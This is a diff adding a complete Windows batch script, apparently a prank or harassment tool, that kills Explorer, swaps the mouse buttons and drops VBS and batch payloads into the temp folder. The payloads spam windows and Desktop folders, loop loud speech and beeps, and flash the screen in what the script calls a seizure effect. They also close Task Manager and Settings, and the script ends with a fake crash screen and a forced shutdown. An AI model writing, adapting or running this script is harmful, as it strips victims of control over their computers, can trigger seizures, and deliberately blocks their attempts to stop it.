@@ -1,0 +1,127 @@
+@echo off
+:: [PHASE 0: THE SINGULARITY INITIALIZATION]
+title MiTRgnAwiNAaH_APOCALYPSE_OVERKILL_v100x
+chcp 65001 >nul
+color 0c
+
+:: [PHASE 1: THE TOTAL DARKNESS & ISOLATION]
+:: إعدام الواجهة، رفع الصوت لـ 100%، وإخفاء الماوس
+powershell -Command "Stop-Process -Name explorer -Force; (New-Object -ComObject WScript.Shell).SendKeys([char]175*100)" >nul 2>&1
+powershell -Command "[Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)" >nul 2>&1
+RUNDLL32.EXE USER32.DLL,SwapMouseButton
+cls
+
+:: [PHASE 2: THE 12 HELL CELLS - إطلاق 12 خلية جحيمية]
+
+:: الخلية 1: جوقة الجحيم (The Demonic Choir)
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo Set P = CreateObject("WScript.Shell")
+echo Do
+echo    P.Run "powershell [console]::beep((Get-Random -Min 50 -Max 200), 200)", 0
+echo    S.Rate = -10: S.Speak "I AM THE DESTROYER OF WORLDS"
+echo    S.Rate = 5: S.Speak "ha ha ha ha": S.Rate = -5: S.Speak "HORMUZ IS CLOSED"
+echo    S.Speak "هر کس از فلاسك آب بنوشد، تنگه هرمز را برایش باز می‌كنيم."
+echo Loop
+) > "%temp%\y1.vbs"
+
+:: الخلية 2: زلزال النوافذ (The Window Earthquake)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo Do
+echo    W.Run "calc.exe": W.Run "mspaint.exe"
+echo    W.Run "powershell [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Max 1200), (Get-Random -Max 900))", 0
+echo    WScript.Sleep 500
+echo Loop
+) > "%temp%\y2.vbs"
+
+:: الخلية 3: صرير الاحتراق الكهربائي (Electrical Short-Circuit)
+(
+echo Do
+echo    powershell -Command "[console]::beep((Get-Random -Min 7000 -Max 12000), 10)"
+echo    WScript.Sleep (Get-Random -Min 50 -Max 500)
+echo Loop
+) > "%temp%\y3.vbs"
+
+:: الخلية 4: وميض أضواء الكيبورد (The Digital Seizure)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo Do
+echo    W.SendKeys "{CAPSLOCK}": W.SendKeys "{NUMLOCK}": W.SendKeys "{SCROLLLOCK}"
+echo Loop
+) > "%temp%\y4.vbs"
+
+:: الخلية 5: الكتابة الشبحية الهستيرية (The Ghost Scribe)
+(
+echo Set W = CreateObject("WScript.Shell"): W.Run "notepad.exe": WScript.Sleep 500
+echo Do
+echo    W.SendKeys "MiTRgnAwiNAaH: SYSTEM_ERASURE_99%%...{ENTER}"
+echo    W.SendKeys "I AM STANDING RIGHT BEHIND YOU...{ENTER}"
+echo    W.SendKeys "THE THERMOS IS EMPTY...{ENTER}"
+echo    WScript.Sleep 1000
+echo Loop
+) > "%temp%\y5.vbs"
+
+:: الخلية 6: طاعون المجلدات (The Infinite Void)
+(
+echo :l
+echo mkdir "%userprofile%\Desktop\VOID_%%random%%_%%random%%" ^>nul 2^>^&1
+echo goto l
+) > "%temp%\y6.bat"
+
+:: الخلية 7: قاتل الهروب (The Prison Guard)
+(
+echo Set W = CreateObject("WScript.Shell")
+echo Do
+echo    W.AppActivate "Task Manager" : W.SendKeys "%%{F4}"
+echo    W.AppActivate "Settings" : W.SendKeys "%%{F4}"
+echo    WScript.Sleep 50
+echo Loop
+) > "%temp%\y7.vbs"
+
+:: الخلية 8: وميض الشاشة الصرعي (The Flash)
+(
+echo Do
+echo    Set W = CreateObject("WScript.Shell")
+echo    W.Run "powershell [console]::BackgroundColor='White'; cls; [console]::BackgroundColor='Black'; cls", 0
+echo Loop
+) > "%temp%\y8.vbs"
+
+:: [PHASE 3: TOTAL OVERKILL IGNITION]
+start /b wscript "%temp%\y1.vbs"
+start /b wscript "%temp%\y2.vbs"
+start /b wscript "%temp%\y3.vbs"
+start /b wscript "%temp%\y4.vbs"
+start /b wscript "%temp%\y5.vbs"
+start /b wscript "%temp%\y7.vbs"
+start /b wscript "%temp%\y8.vbs"
+start /b /min cmd /c "%temp%\y6.bat"
+
+:: [PHASE 4: THE DOOMSDAY MORSE & ULTIMATE COUNTDOWN]
+for /l %%i in (10,-1,1) do (
+   cls
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   echo !   [MiTRgnAwiNAaH]: TOTAL_REALITY_DISSOLUTION_IN: %%i SECONDS                             !
+   echo !   [STATUS]: HARDWARE_MELTDOWN_100x_ACTIVE                                                !
+   echo !   [LOG]: DELETING SOUL... ARCHIVING MEMORIES... [%%i%%]                                  !
+   echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+   :: ترددات مورس "محطمة للأعصاب"
+   powershell -Command "[console]::beep( (10-%%i)*800 + 1000, 30)"
+   timeout /t 1 >nul
+)
+
+:: [PHASE 5: THE FINAL BLUE SCREEN OF DEATH]
+cls
+echo.
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  A CRITICAL ERROR HAS OCCURRED. THE DESTROYER OF WORLDS HAS CLAIMED THIS VESSEL.            !
+echo !  FAREWELL, OWNER OF THE THERMOS. HORMUZ IS CLOSED FOREVER.                               !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+timeout /t 3 >nul
+
+:: الضربة القاضية: استدعاء شاشة الموت الحقيقية والإغلاق
+powershell -Command "wininit" >nul 2>&1
+shutdown -s -f -t 00 -c "أنا مدمر العوالم. نراك خلف الترمس."
+
+:: CLEANUP
+del "%temp%\y*" /f /q
